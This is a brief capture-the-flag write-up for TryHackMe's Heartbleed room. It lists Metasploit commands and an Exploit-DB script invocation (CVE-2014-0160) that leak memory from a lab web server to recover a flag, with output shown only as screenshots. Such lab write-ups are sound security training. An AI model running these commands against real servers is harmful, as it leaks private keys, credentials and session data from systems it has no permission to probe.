# [HeartBleed](https://tryhackme.com/room/heartbleed)

## SSL issues are still lurking in the wild! Can you exploit this web servers OpenSSL?

# Protecting Data In Transit

## In this task, you need to obtain a flag using a very well-known vulnerability. Make sure you pay attention to all the information and errors displayed. Pay particular attention to how web servers are configured.

### What is the flag?

Hint: `https://<ip>`

1. Exploit vulnerability using Metasploit

```Bash
msfconsole -q
search heartbleed
use 4
```

![SCREEN01](https://github.com/user-attachments/assets/9b029ace-6c78-4483-ab9b-c789023244d2)

```Bash
set rhosts <IP>
set verbose true
run
```

![SCREEN02](https://github.com/user-attachments/assets/f0d49602-cc80-47f0-967d-8faf7ee413e5)

2. Get the flag from message

![SCREEN03](https://github.com/user-attachments/assets/d0145b6d-d2df-4ba0-aeff-cf15e8949ac7)

### Alternative way:

1. Run the [CVE 2014-0160](https://www.exploit-db.com/exploits/32745) exploit (Remember to set scrollback to 'Unlimited')

```Bash
python 32745.py <IP> -p 443
```

![SCREEN04](https://github.com/user-attachments/assets/51362b41-a6c6-4ac1-83f0-72d9408e6ed8)
![SCREEN05](https://github.com/user-attachments/assets/183c3a81-9a75-45a3-8ae9-7eaf79e5d1ad)
